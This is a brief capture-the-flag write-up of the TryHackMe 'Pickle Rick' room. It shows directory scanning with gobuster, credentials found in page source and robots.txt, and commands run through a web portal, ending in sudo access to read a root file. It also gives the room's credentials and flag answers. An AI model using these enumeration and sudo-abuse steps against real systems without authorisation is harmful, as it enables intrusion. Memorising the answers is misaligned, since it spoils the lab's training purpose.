# Matheus Jesus 01-05-2020

## Try Hack Me - [Pickle Rick](https://tryhackme.com/room/picklerick)

### IP 10.10.69.83

#### Recon

Apache/2.4.18 (Ubuntu) Server at 10.10.69.83 Port 80

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)

gobuster dir -u 10.10.69.83 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

#### Finding Rick's username and password

Open website 10.10.69.83

Ctrl+U

```html
  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->
```

/robots.txt -> Wubbalubbadubdub

#### Login on Website

R1ckRul3s:Wubbalubbadubdub -> takes us to /portal.php

#### Running Commands on Portal.php

```sh
ls
# Sup3rS3cretPickl3Ingred.txt
# assets
# clue.txt
# denied.php
# index.html
# login.php
# portal.php
# robots.txt
```

First ingredient is on /var/www/html/Sup3rS3cretPickl3Ingred.txt

```text
/Sup3rS3cretPickl3Ingred.txt
#mr. meeseek hair
```

Second ingredient is on /home/rick/second ingredients

```sh
less /home/rick/"second ingredients"
#1 jerry tear
```

```sh
sudo -l
sudo ls -la /root
sudo less /root/3rd.txt
#3rd ingredients: fleeb juice
```
